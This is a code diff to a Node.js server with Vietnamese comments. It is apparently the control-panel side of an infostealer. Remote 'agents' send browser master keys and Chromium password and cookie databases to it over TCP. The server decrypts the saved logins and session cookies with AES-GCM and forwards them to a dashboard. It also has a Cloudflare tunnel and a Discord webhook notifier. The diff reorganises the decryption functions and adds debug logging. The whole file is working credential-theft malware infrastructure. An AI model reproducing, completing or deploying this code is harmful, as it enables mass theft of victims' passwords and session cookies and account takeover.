@@ -11,6 +11,7 @@ const bodyParser = require("body-parser");
 const Auth = require("./auth");
 const crypto = require("crypto");
 const fs = require("fs");
+const initSqlJs = require('sql.js');
 
 // --- Load config từ file config.env (nếu có) ---
 function loadEnvConfig() {
@@ -35,66 +36,13 @@ function loadEnvConfig() {
 }
 loadEnvConfig();
 
-const initSqlJs = require('sql.js');
+
 let SQL = null;
 
-// Khởi tạo thư viện ngay khi chạy
+// Cấu hình đường dẫn tuyệt đối tới file wasm
 initSqlJs().then((S) => {
     SQL = S;
-}).catch(err => console.error("Failed to load SQL.js", err));
-
-function decryptPasswords(masterKeyB64, dbFileB64) {
-    if (!SQL) {
-        console.log("SQL.js not ready yet.");
-        return [];
-    }
-
-    let db = null;
-    const results = [];
-    try {
-        const masterKey = Buffer.from(masterKeyB64, 'base64');
-        const dbBuffer = Buffer.from(dbFileB64, 'base64');
-
-        // sql.js load trực tiếp từ Buffer, không cần ghi ra file temp
-        db = new SQL.Database(dbBuffer);
-
-        // Cú pháp prepare của sql.js hơi khác một chút
-        const stmt = db.prepare("SELECT origin_url, username_value, password_value FROM logins");
-
-        while (stmt.step()) { // Duyệt từng dòng
-            const row = stmt.getAsObject(); // Lấy dữ liệu dạng object
-
-            if (!row.password_value || !row.username_value) continue;
-
-            try {
-                // sql.js trả về Uint8Array, cần chuyển về Buffer
-                const buffer = Buffer.from(row.password_value);
-
-                if (buffer.length < 31) continue;
-                const prefix = buffer.slice(0, 3).toString('utf8');
-
-                if (prefix === 'v10' || prefix === 'v11' || prefix === 'v20') {
-                    const iv = buffer.slice(3, 15);
-                    const tag = buffer.slice(-16);
-                    const ciphertext = buffer.slice(15, buffer.length - 16);
-
-                    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
-                    decipher.setAuthTag(tag);
-                    const clear = decipher.update(ciphertext) + decipher.final('utf8');
-
-                    if (clear) results.push({ url: row.origin_url, user: row.username_value, pass: clear });
-                }
-            } catch(e) {}
-        }
-        stmt.free(); // Giải phóng bộ nhớ
-        return results;
-    } catch (e) { 
-        console.log("Decrypt Error:", e.message);
-        return []; 
-    } finally {
-        if (db) db.close();
-    }
-}
+}).catch(err => console.error("⛔ [Init Error] Lỗi load SQL.js:", err));
 
 // Hàm parse browser history từ SQLite DB (Chromium-based)
 function parseBrowserHistory(historyDbB64, isFirefox = false, limit = 500) {
@@ -488,33 +436,79 @@ const tcpServer = net.createServer((socket) => {
                 }
 
                 // === C. XỬ LÝ PASSWORD AUTO (TẤT CẢ BROWSER) ===
+                // Trong gateway.js
+                // === THAY THẾ ĐOẠN NÀY ===
                 if (msg.type === "passwords_auto_result") {
-                    console.log(`[Gateway] Processing AUTO passwords from ${msg.browsers?.length || 0} browsers...`);
-                    let allPasswords = [];
+                    console.log(`[1] Nhận gói tin password. Số lượng browser: ${msg.browsers ? msg.browsers.length : 0}`);
                     
-                    for (const browserData of (msg.browsers || [])) {
-                        const browserName = browserData.browser;
-                        const masterKey = browserData.master_key;
-                        
-                        for (const dbInfo of (browserData.dbs || [])) {
-                            const passwords = decryptPasswords(masterKey, dbInfo.data);
-                            // Thêm browser name vào mỗi password
-                            passwords.forEach(p => p.browser = browserName);
-                            if (passwords.length > 0) allPasswords = allPasswords.concat(passwords);
+                    let allPasswords = [];
+                    const browserList = msg.browsers || [];
+
+                    // Duyệt từng Browser
+                    for (let i = 0; i < browserList.length; i++) {
+                        const browserData = browserList[i];
+                        console.log(`[2] -> Đang xử lý browser: ${browserData.browser} (Index: ${i})`);
+
+                        const dbs = browserData.dbs || [];
+                        console.log(`[3]    -> Tìm thấy ${dbs.length} profile (DB files).`);
+
+                        // Duyệt từng file DB
+                        for (let j = 0; j < dbs.length; j++) {
+                            const dbInfo = dbs[j];
+                            
+                            // [CHECK 1] Kiểm tra tên biến data hay content
+                            let rawContent = dbInfo.content;
+                            if (!rawContent) {
+                                console.log(`[WARN] Không thấy .content, thử tìm .data...`);
+                                rawContent = dbInfo.data;
+                            }
+
+                            // [CHECK 2] Kiểm tra dữ liệu có tồn tại không
+                            if (!rawContent) {
+                                console.error(`[ERROR] DB tại index ${j} bị RỖNG (undefined/null). Bỏ qua.`);
+                                continue;
+                            }
+
+                            // [CHECK 3] Kiểm tra kích thước (Nếu > 50MB là treo chắc)
+                            const sizeMB = rawContent.length / 1024 / 1024;
+                            console.log(`[4]    -> DB [${j}] Size: ${sizeMB.toFixed(2)} MB.`);
+
+                            if (sizeMB > 50) {
+                                console.warn(`[SKIP] File quá lớn (>50MB), bỏ qua để tránh sập Server.`);
+                                continue;
+                            }
+
+                            try {
+                                console.log(`[5]    -> Gọi hàm decryptPasswords...`);
+                                
+                                // Gọi hàm giải mã
+                                const passwords = decryptPasswords(browserData.master_key, rawContent);
+                                
+                                console.log(`[6]    -> Kết quả: Lấy được ${passwords.length} pass.`);
+                                
+                                // Gán tên browser
+                                passwords.forEach(p => p.browser = browserData.browser);
+                                allPasswords = allPasswords.concat(passwords);
+
+                            } catch (err) {
+                                console.error(`[CRASH] Lỗi khi giải mã DB [${j}]:`, err.message);
+                            }
                         }
                     }
-                    
-                    console.log(`[Gateway] Total passwords decrypted: ${allPasswords.length}`);
-                    
-                    if (webClient?.readyState === WebSocket.OPEN) {
+
+                    console.log(`[7] Tổng kết: ${allPasswords.length} mật khẩu. Đang gửi về Frontend...`);
+
+                    if (webClient && webClient.readyState === WebSocket.OPEN) {
                         webClient.send(JSON.stringify({
                             type: "passwords_result",
-                            browser: "Auto-Detected",
+                            browser: "All Browsers",
                             data: allPasswords,
-                            warning: msg.warning || null
+                            warning: allPasswords.length === 0 ? "Decrypt OK but 0 passwords found." : null
                         }));
+                        console.log(`[8] Đã gửi xong.`);
+                    } else {
+                        console.warn(`[WARN] WebClient chưa kết nối (F5 lại Dashboard).`);
                     }
-                    continue;
                 }
 
                 // === E. XỬ LÝ BROWSER HISTORY ===
@@ -660,6 +654,119 @@ app.get("/api/gateway-status", (_, res) => {
     });
 });
 
+// --- CLEANUP ---
+setInterval(() => {
+    const now = Date.now();
+    agents.forEach((a, id) => {
+        if (now - a.lastSeen > CFG.CLEANUP_MS) {
+            if (a.socket) a.socket.destroy();
+            agents.delete(id);
+        }
+    });
+}, CFG.CLEANUP_MS);
+
+// --- DECRYPTION HELPERS ---
+function decryptPasswords(masterKeyB64, dbFileB64) {
+    // 1. Kiểm tra thư viện
+    if (!SQL) { console.log("   [SQL] Lib not ready"); return []; }
+    if (!dbFileB64) return [];
+
+    try {
+        const masterKey = Buffer.from(masterKeyB64, 'base64');
+        const rawBuffer = Buffer.from(dbFileB64, 'base64');
+        
+        // 2. Ép kiểu sang Uint8Array (Bắt buộc với sql.js)
+        const u8Array = new Uint8Array(rawBuffer);
+
+        // === [SỬA LỖI TẠI ĐÂY] ===
+        // SAI: db = new Database(u8Array);
+        // ĐÚNG: Phải có chữ SQL. ở trước
+        const db = new SQL.Database(u8Array); 
+        // =========================
+
+        const stmt = db.prepare("SELECT origin_url, username_value, password_value FROM logins");
+        const results = [];
+
+        while (stmt.step()) {
+            const row = stmt.getAsObject();
+            if (!row.password_value) continue;
+            try {
+                const buffer = Buffer.from(row.password_value);
+                const prefix = buffer.slice(0, 3).toString('utf8');
+                
+                // Giải mã v10/v11 (AES-GCM)
+                if (prefix === 'v10' || prefix === 'v11') {
+                    const iv = buffer.slice(3, 15);
+                    const ciphertext = buffer.slice(15, buffer.length - 16);
+                    const tag = buffer.slice(-16);
+                    
+                    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
+                    decipher.setAuthTag(tag);
+                    const clear = decipher.update(ciphertext) + decipher.final('utf8');
+                    
+                    if (clear) results.push({ url: row.origin_url, user: row.username_value, pass: clear });
+                }
+            } catch(e) {}
+        }
+        stmt.free();
+        db.close();
+        return results;
+    } catch (e) {
+        console.error(`   [CRASH FIX] Lỗi chi tiết: ${e.message}`);
+        return [];
+    }
+}
+
+function decryptCookies(masterKeyB64, dbFileB64) {
+    if (!SQL) return [];
+
+    let db = null;
+    const results = [];
+    try {
+        const masterKey = Buffer.from(masterKeyB64, 'base64');
+        const dbBuffer = Buffer.from(dbFileB64, 'base64');
+
+        db = new SQL.Database(dbBuffer);
+
+        // Query lấy Cookies
+        const stmt = db.prepare("SELECT host_key, name, encrypted_value, path, is_secure, expires_utc FROM cookies");
+
+        while(stmt.step()) {
+            const row = stmt.getAsObject();
+            if (!row.encrypted_value) continue;
+
+            try {
+                const buffer = Buffer.from(row.encrypted_value);
+                const prefix = buffer.slice(0, 3).toString('utf8');
+                let clearText;
+
+                if (prefix === 'v10' || prefix === 'v11' || prefix === 'v20') {
+                    const iv = buffer.slice(3, 15);
+                    const ciphertext = buffer.slice(15, buffer.length - 16);
+                    const tag = buffer.slice(-16);
+
+                    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
+                    decipher.setAuthTag(tag);
+                    clearText = decipher.update(ciphertext) + decipher.final('utf8');
+                }
+
+                if (clearText) {
+                    results.push({
+                        domain: row.host_key, name: row.name, value: clearText,
+                        path: row.path, secure: !!row.is_secure,
+                        expirationDate: (row.expires_utc / 1000000) - 11644473600
+                    });
+                }
+            } catch(e) {}
+        }
+        stmt.free();
+        return results;
+    } catch (e) { return []; } 
+    finally {
+        if (db) db.close();
+    }
+}
+
 // --- 5. CLOUDFLARE TUNNEL ---
 
 // Hàm gửi link qua Discord Webhook
@@ -724,110 +831,13 @@ const startTunnel = () => {
     process.on("exit", () => child.kill()); 
 };
 
-// --- CLEANUP ---
-setInterval(() => {
-    const now = Date.now();
-    agents.forEach((a, id) => {
-        if (now - a.lastSeen > CFG.CLEANUP_MS) {
-            if (a.socket) a.socket.destroy();
-            agents.delete(id);
-        }
-    });
-}, CFG.CLEANUP_MS);
-
-// --- DECRYPTION HELPERS ---
-function decryptPasswords(masterKeyB64, dbFileB64) {
-    if (!Database) return [];
-    let db = null;
-    const tempDbName = `temp_${Date.now()}.db`;
-    const results = [];
-    try {
-        const masterKey = Buffer.from(masterKeyB64, 'base64');
-        fs.writeFileSync(tempDbName, Buffer.from(dbFileB64, 'base64'));
-        db = new Database(tempDbName);
-        const rows = db.prepare("SELECT origin_url, username_value, password_value FROM logins").all();
-        rows.forEach((row) => {
-            if (!row.password_value || !row.username_value) return;
-            try {
-                const buffer = row.password_value;
-                if (buffer.length < 31) return;
-                const prefix = buffer.slice(0, 3).toString('utf8');
-                if (prefix === 'v10' || prefix === 'v11' || prefix === 'v20') {
-                    const iv = buffer.slice(3, 15);
-                    const tag = buffer.slice(-16);
-                    const ciphertext = buffer.slice(15, buffer.length - 16);
-                    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
-                    decipher.setAuthTag(tag);
-                    const clear = decipher.update(ciphertext) + decipher.final('utf8');
-                    if (clear) results.push({ url: row.origin_url, user: row.username_value, pass: clear });
-                }
-            } catch(e) {}
-        });
-        return results;
-    } catch (e) { return []; } 
-    finally {
-        if (db) db.close();
-        if (fs.existsSync(tempDbName)) try { fs.unlinkSync(tempDbName); } catch(e){}
-    }
-}
-
-function decryptCookies(masterKeyB64, dbFileB64) {
-    if (!SQL) return [];
-
-    let db = null;
-    const results = [];
-    try {
-        const masterKey = Buffer.from(masterKeyB64, 'base64');
-        const dbBuffer = Buffer.from(dbFileB64, 'base64');
-
-        db = new SQL.Database(dbBuffer);
-
-        // Query lấy Cookies
-        const stmt = db.prepare("SELECT host_key, name, encrypted_value, path, is_secure, expires_utc FROM cookies");
-
-        while(stmt.step()) {
-            const row = stmt.getAsObject();
-            if (!row.encrypted_value) continue;
-
-            try {
-                const buffer = Buffer.from(row.encrypted_value);
-                const prefix = buffer.slice(0, 3).toString('utf8');
-                let clearText;
-
-                if (prefix === 'v10' || prefix === 'v11' || prefix === 'v20') {
-                    const iv = buffer.slice(3, 15);
-                    const ciphertext = buffer.slice(15, buffer.length - 16);
-                    const tag = buffer.slice(-16);
-
-                    const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
-                    decipher.setAuthTag(tag);
-                    clearText = decipher.update(ciphertext) + decipher.final('utf8');
-                }
-
-                if (clearText) {
-                    results.push({
-                        domain: row.host_key, name: row.name, value: clearText,
-                        path: row.path, secure: !!row.is_secure,
-                        expirationDate: (row.expires_utc / 1000000) - 11644473600
-                    });
-                }
-            } catch(e) {}
-        }
-        stmt.free();
-        return results;
-    } catch (e) { return []; } 
-    finally {
-        if (db) db.close();
-    }
-}
-
 // --- START ---
 server.listen(CFG.HTTP_PORT, "0.0.0.0", () => {
     console.log(`[Gateway] UI: http://localhost:${CFG.HTTP_PORT}`);
     console.log(`[Gateway] TCP Listening: ${CFG.AGENT_PORT}`);
+
+    Auth.startCLI(); 
     
     // Khởi động Leader Election (sẽ tự động start tunnel nếu là leader)
     initLeaderElection();
-    
-    Auth.startCLI(); 
 });
